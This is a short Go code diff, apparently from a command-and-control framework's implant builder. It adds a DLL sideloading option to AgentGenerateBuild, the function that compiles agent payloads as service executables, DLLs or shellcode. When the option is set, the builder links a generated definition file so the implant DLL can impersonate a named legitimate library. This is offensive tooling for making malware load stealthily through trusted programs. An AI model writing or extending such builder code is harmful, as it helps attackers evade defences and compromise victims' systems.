@@ -31,6 +31,8 @@ type GenerateConfig struct {
 	IsWorkingTime bool   `json:"is_workingtime"`
 	StartTime     string `json:"start_time"`
 	EndTime       string `json:"end_time"`
+	IsSideloading bool   `json:"is_sideloading"`
+	SideloadingName   string   `json:"sideloading_name"`
 }
 
 var (
@@ -286,11 +288,20 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		buildPath = tempDir + "/svc.exe"
 		Filename = "svc_" + Filename + ".exe"
 	} else if generateConfig.Format == "DLL" {
-		Files += ObjectDir + "/main_dll" + Ext
-		lFlags += " -shared"
-		buildPath = tempDir + "/file.dll"
-		Filename += ".dll"
-	} else if generateConfig.Format == "Shellcode" {
+                Files += ObjectDir + "/main_dll" + Ext
+                lFlags += " -shared"
+                buildPath = tempDir + "/file.dll"
+                Filename += ".dll"
+        
+                if generateConfig.IsSideloading {
+                        defPath, err := CreateDefinitionFile(generateConfig.SideloadingName, tempDir)
+			if err != nil {
+				return nil, "", err
+			}
+                        lFlags += " " + defPath
+                }
+        
+        } else if generateConfig.Format == "Shellcode" {
 		Files += ObjectDir + "/main_shellcode" + Ext
 		lFlags += " -shared"
 		buildPath = tempDir + "/file.dll"
